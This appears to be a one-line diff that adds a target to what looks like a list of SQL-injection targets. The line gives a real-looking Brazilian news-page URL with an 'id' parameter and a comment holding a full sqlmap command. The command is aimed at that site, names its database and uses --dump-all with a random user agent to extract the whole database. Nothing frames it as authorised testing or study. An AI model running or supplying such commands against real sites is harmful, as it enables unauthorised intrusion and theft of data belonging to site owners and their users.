@@ -1,0 +1,1 @@
+http://www.correspondentecaixars.com.br/noticias.php?id=8 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.correspondentecaixars.com.br/noticias.php?id=8 -D corresp-noticias --dump-all
